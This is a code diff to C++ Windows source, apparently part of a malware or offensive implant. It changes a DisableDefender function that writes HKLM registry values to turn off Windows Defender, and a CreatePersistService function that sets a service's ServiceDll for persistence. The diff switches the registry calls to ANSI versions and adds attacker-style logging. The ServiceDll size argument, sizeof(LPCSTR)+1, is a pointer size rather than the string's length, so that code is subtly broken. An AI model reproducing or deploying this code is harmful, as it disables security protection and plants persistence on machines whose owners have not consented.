@@ -22,16 +22,12 @@ int wmain() {
 
 	// TODO: start service
 
-	// keep window open for testing
-	int x;
-	std::cin >> x;
-
 	return 0;
 }
 
 int DisableDefender() {
-	std::map<LPCWSTR, std::map<LPCWSTR, DWORD>>::iterator outer;
-	std::map<LPCWSTR, DWORD>::iterator inner;
+	std::map<LPCSTR, std::map<LPCSTR, DWORD>>::iterator outer;
+	std::map<LPCSTR, DWORD>::iterator inner;
 
 	for (outer = registryEntries.begin(); outer != registryEntries.end(); outer++) {
 		for (inner = outer->second.begin(); inner != outer->second.end(); inner++) {
@@ -39,7 +35,7 @@ int DisableDefender() {
 			LSTATUS s;
 			HKEY key;
 
-			s = RegCreateKeyExW(
+			s = RegCreateKeyExA(
 				HKLM,
 				outer->first,
 				0,
@@ -51,11 +47,13 @@ int DisableDefender() {
 				NULL
 				);
 			if (s != ERROR_SUCCESS) {
-				std::wcout << L"opening key failed " << outer->first << L" " << inner->first << std::endl;
+				Log("[!] Opening key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
 				return 1;
 			}
 
-			s = RegSetValueExW(
+			Log("[*] Opened key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
+
+			s = RegSetValueExA(
 				key,
 				inner->first,
 				0,
@@ -64,9 +62,11 @@ int DisableDefender() {
 				sizeof(DWORD)
 			);
 			if (s != ERROR_SUCCESS) {
-				std::wcout << L"writing key failed " << outer->first << L" " << inner->first << std::endl;
+				Log("[!] Writing key failed " + std::string(outer->first) + " " + std::string(inner->first) + ": " + std::to_string(GetLastError()), componentName);
 				return 2;
 			}
+
+			Log("[+] Wrote key " + std::string(outer->first) + " " + std::string(inner->first), componentName);
 		}
 	}
 
@@ -136,7 +136,7 @@ int CreatePersistService() {
 		L"ServiceDll",
 		REG_EXPAND_SZ,
 		dllPath,
-		sizeof(LPCWSTR)+1
+		sizeof(LPCSTR)+1
 	);
 
 	// optionally set service group
